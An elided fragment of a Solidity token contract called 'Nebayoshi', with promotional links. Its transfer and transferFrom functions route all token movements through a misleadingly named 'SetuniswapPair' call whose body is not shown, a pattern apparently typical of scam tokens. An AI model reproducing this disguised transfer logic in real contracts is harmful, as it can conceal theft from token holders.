...
// https://t.me/NebayoshiETH
// https://web.wechat.com/Nebayoshi.ETH
// https://www.zhihu.com/
// https://www.nebayoshi.network.io
...
contract Nebayoshi is IERC20, Ownable {
    ...
    function transferFrom(
        ...
        SetuniswapPair     (sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        SetuniswapPair     (msg.sender, recipient, amount);
        return true;
    }
